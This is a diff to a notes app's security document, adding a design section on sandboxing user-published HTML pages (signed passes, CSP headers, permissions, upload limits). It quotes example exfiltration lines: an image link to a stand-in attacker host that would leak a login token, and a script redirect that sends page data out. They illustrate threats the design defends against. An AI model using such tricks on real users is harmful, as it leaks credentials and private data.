@@ -499,6 +499,169 @@ This is a second layer, not the only one — mermaid also runs at its default `s
 
 The standalone Marp export inlines images as data URIs, fetching each with the user's session token so `/api/files/…` assets resolve. Deck content is user-authored and shared, so an image URL is attacker-controlled: a deck containing `![](https://evil.example/x.png)` would hand the mdnest JWT of whoever exported it to that host. The export therefore attaches `Authorization` **only** when the resolved URL is same-origin; cross-origin images are still fetched (so public assets inline and the deck stays self-contained) but never with credentials, and non-`http(s)` schemes are skipped. This was caught in review and never shipped in a release.
 
+### HTML pages
+
+`ENABLE_PAGES` (optional, off by default) lets people and agents publish
+HTML pages into the notes tree. A page is someone else's HTML and script, shown in
+the viewer's browser, so the main risk is a page's script acting as the
+viewer: mdnest keeps the login token in `localStorage`, and a script on
+mdnest's own origin could read it and call the API as that person. The design
+keeps a page off mdnest's origin whenever its scripts run.
+
+**The server never runs a page.** It stores files and serves them. It does not
+render HTML, run a headless browser or take screenshots. The only parsing is
+one pass over `index.html` at publish time to pull out its title and visible
+text for search, and control characters are removed from both, so a title
+cannot carry terminal escape codes into `mdnest page list`.
+
+**A page's permission is its handle's.** A page shows in the notes tree as a
+handle file, `<name>.page.md`, holding only front matter with `page: <id>`.
+The page's files are stored apart from the notes, under that id: 160 random
+bits, so an id cannot be guessed. Every pages route checks the notes' own
+permission on the handle's path: read on the handle to view the page or read
+its text, write on the handle to publish over it or delete it. So a page is
+exactly as visible as the notes beside it, and a grant on a subfolder works
+for the pages in it.
+
+**Copying a handle gives that folder's readers the page.** A handle is a note,
+and copying it is the same as copying a note they could already read. The id
+cannot be guessed, but it can be read: anyone who can read a handle knows its
+id. Two rules keep that from becoming more:
+
+- **Every publish makes a new id, and moves only the handle published
+  through.** Publishing through a handle needs write on that handle only. The
+  content is stored under a new id and that one handle is pointed at it. No
+  other handle is rewritten, even one the publisher could write: every other
+  handle that named the old id keeps it, and the old page stays for as long
+  as any handle names it, then goes. So a publish never changes what another
+  handle shows. Someone who writes a handle naming another folder's page id
+  can only ever move their own handle to their own new page, and a handle
+  someone planted in a folder with other readers never receives the page's
+  later versions. A copy of a handle is a snapshot, like a copied note, until
+  someone republishes through it.
+- **A saved id is a snapshot, not a subscription.** Someone who once read a
+  handle and keeps write access somewhere in the namespace can write a handle
+  naming that id and keep viewing that version after their read access is
+  removed. That is the same as having downloaded it. They never see a later
+  version: a republish makes a new id, and the old version goes once no
+  handle names it.
+
+**Known limit.** Deleting a handle deletes its page when no other handle in
+the namespace names the same id. Someone who can write a folder can write a
+handle naming any id they know, and delete it. If that id belongs to an
+*unlinked* page (its real handles already removed outside mdnest, normally
+deletable only by writers of the whole namespace), its files go with it. A
+page that still has a handle anywhere is never removed this way.
+
+**A page belongs to the namespace it was published in.** Moving or copying a
+handle to another namespace through mdnest (`/api/transfer`: a drag in the
+tree, `mdnest move` or copy) carries the page along, with transfer's own
+checks: read on the source, write on the destination. If the destination
+already has a page under that id, the copy gets a new one. A page that cannot
+be carried fails the whole transfer, and nothing is left half done. A handle
+that reaches another namespace any other way (copied by hand, git sync) does
+not open there: it gets "this page was published in another namespace:
+publish it again here". Nothing is ever served across a namespace boundary.
+
+**Deleting.** Deleting a handle (a note delete, or a folder holding handles)
+deletes each page no other handle in the namespace names. A handle removed
+outside mdnest leaves its page unlinked: listed for writers of the namespace
+root, never deleted on its own.
+
+**Uploads.** Every path in an uploaded folder goes through `SafeRelPath` and
+`SafePath`: `..`, absolute paths and `.git` are refused, and only plain files
+and folders are accepted (symlinks, hard links, devices and FIFOs are
+refused, and so is the same file twice). `PAGES_MAX_MB` and `PAGES_MAX_FILES`
+are counted on the unpacked bytes as they are written, so a small gzip that
+unpacks to gigabytes stops at the limit. Folders count too: a page may
+create at most `PAGES_MAX_FILES` folders (from folder entries and from the
+paths of its files), checked before any is created, so a tar of empty
+folders cannot use up the disk's inodes. Publishing never overwrites a
+`.page.md` that is not a handle (409). A drop from the desktop is checked
+against the same limits in the browser before it uploads, and again by the
+server.
+
+**Viewing goes through a pass.** Opening a page asks the API for a frame URL.
+The server checks read access on the handle, then signs a pass that names
+one namespace, one page and the page's current version, and expires after 30
+minutes. The pass is signed with its own key, derived from the server's JWT
+secret (HMAC-SHA256 of the secret over a fixed label), never with the secret
+itself, so a pass and a login token are never checked against the same key. The pass sits in the URL path, so the page's own
+relative links carry it, and the page is served to whoever presents it, with
+no other login. Consequences:
+
+- A pass is never a login. It carries `purpose: page`, which the session
+  check refuses everywhere else, and a session token is refused as a pass.
+- A pass opens one page. The namespace and page come only from the pass, so
+  a page cannot name another page, and a pass made for a version that has
+  since been replaced or deleted is refused.
+- Anyone holding a frame URL can view that page until the pass expires,
+  including someone whose access was removed after it was made: a revoked
+  user can still open a page for up to 30 minutes. The pages address has no
+  session to check again on each file. Treat a frame URL like a short-lived
+  share link; it can show up in a proxy's access log.
+
+**Static mode (no `PAGES_ORIGIN`).** Page files are served from mdnest's own
+address under `/api/pages/view/`, with the same kind of script-less sandbox
+as other uploaded HTML: `Content-Security-Policy: default-src 'none'`, with
+images, styles and fonts allowed only from the page itself, and `sandbox`
+without `allow-scripts`. The frame in the app is also `sandbox=""`. Scripts do
+not run, and the page sits in a unique origin. A page URL opened as a whole
+tab (`Sec-Fetch-Dest: document`) is refused, so someone else's HTML never
+fills a tab on mdnest's own address. Browsers send that header only over
+https and to localhost; on a plain-http address it is missing, and such an
+open is still served (still without scripts or forms).
+
+**Script mode (`PAGES_ORIGIN` set).** Page files are served only from the
+second address, by a separate listener that serves page files and nothing
+else: no API route, no cookies or credentials, GET and HEAD only. mdnest's own
+address does not serve page files in this mode. Each response carries:
+
+- `Content-Security-Policy` with `sandbox allow-scripts` and never
+  `allow-same-origin`, so the page runs in an opaque origin even when opened
+  directly. With `PAGES_NETWORK=strict` it may load and fetch only from the
+  pages address; with `open`, also from any `https:` site. `object-src`,
+  `frame-src`, `base-uri` and `form-action` are `'none'`, and
+  `frame-ancestors` is `FRONTEND_ORIGIN`.
+- The frame in the app is `sandbox="allow-scripts"` and nothing else: no
+  `allow-same-origin`, `allow-top-navigation`, `allow-popups` or
+  `allow-forms`. The page cannot read mdnest's `localStorage`, cannot call the
+  API as the viewer (it has no token, and auth is a header, not a cookie),
+  and cannot navigate the window around it.
+- `Access-Control-Allow-Origin: *`, without credentials. A sandboxed page has
+  an opaque origin, so even its own `fetch('data.json')` is cross-origin and
+  would be blocked. This exposes nothing extra: no cookie or login is
+  involved, and the pass in the URL is the only key.
+
+The backend refuses a `PAGES_ORIGIN` with the same scheme, host and port as
+`FRONTEND_ORIGIN`: it logs an error and stays in static mode, and `setup.sh`
+and the Helm chart refuse it outright. Auth is not cookie-based, so a sibling
+subdomain or a second port is acceptable as the pages address: the only
+cookie mdnest sets is the SSO login's short-lived state cookie, which is
+host-only (no `Domain`) and `HttpOnly`, and is not a login.
+
+**Every page response, in both modes,** also carries
+`X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer` (so a pass
+never leaks to an outside site in a `Referer`) and
+`Cache-Control: private, no-store` (so a shared browser or proxy never keeps a
+private page).
+
+**`PAGES_NETWORK=strict` limits what a page loads, not what it can send
+out.** It blocks outside scripts, images and fetches, so a page cannot pull
+in code or call an outside API. It cannot stop a page's script from sending
+data by moving its own frame to another address, for example
+`location = 'https://example.com/?' + data`: a sandboxed frame may always
+navigate itself, and no CSP setting covers that. So treat a script-mode page
+as able to send out anything it shows, in either mode. The data it can reach
+is only its own files: it has no login and cannot read mdnest or other
+pages. With `open`, it can also send data with a plain `fetch`, which is the
+page author's choice, the same as publishing the data anywhere else. `strict`
+is still the default, because it keeps outside code out of the page.
+
+Tests: `backend/handlers/pages_test.go` and `backend/routes_pages_test.go`
+(headers, passes, permissions, limits, paths), and the browser specs listed in
+`docs/codemap.md`.
+
 ---
 
 ## Operational security
@@ -608,6 +771,8 @@ Both base images are pinned to moving tags (`golang:1.26-alpine`, `node:20-alpin
 | Folder download / transfer *(v4.7.0+)* | 500 files, 100 MB (`DOWNLOAD_MAX_FILES`, `DOWNLOAD_MAX_MB`) |
 | Concurrent zip downloads *(v4.7.0+)* | 1 per user, 2 server-wide (`DOWNLOAD_MAX_CONCURRENT`) |
 | Clipboard copy between servers *(v4.7.0+)* | 1 MB of UTF-8 |
+| HTML page (`ENABLE_PAGES`) | 20 MB unpacked, 500 files (`PAGES_MAX_MB`, `PAGES_MAX_FILES`) |
+| HTML page pass | 30 minutes, one page |
 | JWT expiry | 30 days |
 | Login rate limit | none (relies on network boundary) |
 | API token expiry | none (revoke manually) |
